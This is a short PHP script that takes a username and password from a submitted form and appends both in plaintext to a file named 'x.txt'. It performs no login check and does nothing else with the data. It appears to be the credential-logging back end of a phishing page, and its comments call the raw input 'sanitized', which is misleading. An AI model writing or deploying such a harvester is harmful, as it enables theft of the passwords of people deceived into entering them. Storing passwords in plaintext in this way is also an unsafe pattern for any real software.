<?php
// Check if the form fields are set in the POST request
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    // Retrieve and sanitize user input
    $user = trim($_POST['username']);
    $pass = trim($_POST['password']);

    // Debugging: Output sanitized variables to ensure they're being retrieved correctly
    // Uncomment these lines temporarily for debugging only.
    // echo "Username: " . htmlspecialchars($user) . "<br>";
    // echo "Password: " . htmlspecialchars($pass) . "<br>";

    // Open the file in append mode
    $file = 'x.txt';
    $fp = fopen($file, 'a');

    // Check if the file was successfully opened
    if ($fp) {
        // Write sanitized inputs to the file
        fwrite($fp, "Username: {$user}\n");
        fwrite($fp, "Password: {$pass}\n");
        fwrite($fp, "---------\n");

        // Close the file
        fclose($fp);

        echo "Data written successfully!";
    } else {
        // Handle error if the file could not be opened
        echo "Error: Unable to open the file. Please check file permissions for $file.";
    }
} else {
    // Handle case where expected POST data is missing
    echo "Error: Username or Password not provided or empty.";
}
?>
